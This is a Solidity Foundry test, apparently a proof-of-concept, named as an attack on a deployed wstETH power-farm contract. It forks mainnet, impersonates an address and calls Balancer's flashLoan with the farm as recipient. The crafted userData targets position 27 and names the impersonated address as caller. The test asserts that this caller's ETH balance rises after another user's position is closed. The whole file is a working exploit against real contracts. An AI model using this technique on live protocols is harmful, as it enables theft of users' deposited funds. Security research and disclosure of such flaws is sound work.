
// SPDX-License-Identifier: -- WISE --

pragma solidity =0.8.21;

import "./wstETHFarmBase.t.sol";

interface IBal {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IWiseLend {

    function getPositionLendingShares(
        uint256 _nftId,
        address _token
    )
        external
        view
        returns (uint256);

    function getPositionBorrowShares(
        uint256 _nftId,
        address _token
    )
        external
        view
        returns (uint256);
}

contract farmClosingAttackTest is wstETHFarmBase {

    // two blocks after position creation
    uint256 internal constant USED_BLOCK = 18264807;

    // one block before creation
    uint256 internal constant BLOCK_BEFORE = 18264804;
    uint256 internal constant BLOCK_NOW = 18268740;

    address balancerVaultAdd = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address payable powerFarmWstethAdd = payable(
        0x63faF7BB2e6FC14619441cc9bA64c4EAf54A60ac
    );

    address wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address aavewethAddress = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address wstethAddress = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address randomUser = 0x9404f4B0846A2cD5c659c1edD52BA60abF1F10F4;

    uint256 public nftIDContract;
    wstETHFarmTester public powerFarm;

    IBal public balalancerInstance;
    IWiseLend public WISE_LENDING_INS;

    function setUp()
        public
    {
        vm.rollFork(
            USED_BLOCK
        );

        powerFarm = wstETHFarmTester(
            powerFarmWstethAdd
        );

        balalancerInstance = IBal(
            balancerVaultAdd
        );

        vm.startPrank(
            randomUser
        );

        WISE_LENDING_INS = IWiseLend(
            0x84524bAa1951247b3A2617A843e6eCe915Bb9674
        );
    }

    function testEndPositionThroughFlashLoanDirectly()
        public
    {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(wethAddress);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 21e18;

        uint256 nftId = 27;

        bytes memory _userData = abi.encode(
            nftId,
            0,
            WISE_LENDING_INS.getPositionLendingShares(
                nftId,
                wstethAddress
            ),
            WISE_LENDING_INS.getPositionBorrowShares(
                nftId,
                aavewethAddress
            ),
            0,
            randomUser,
            true
        );

        /*
        (
            uint256 nftId,
            uint256 initialAmount,
            uint256 lendingShares,
            uint256 borrowShares,
            uint256 minOutAmount,
            address caller,
            bool ethBack

        ) = abi.decode(
            _userData,
            (
                uint256,
                uint256,
                uint256,
                uint256,
                uint256,
                address,
                bool
            )
        );
        */

        uint256 userBalEth = address(randomUser).balance;

        balalancerInstance.flashLoan(
            IFlashLoanRecipient(
                powerFarmWstethAdd
            ),
            tokens,
            amounts,
            _userData
        );

        uint256 newBalEth = address(randomUser).balance;

        console.log(
            "userBalEth:",
            userBalEth / 1E18
        );

        console.log(
            "newBalEth:",
            newBalEth / 1E18
        );

        assertGt(
            newBalEth,
            userBalEth
        );
    }
}



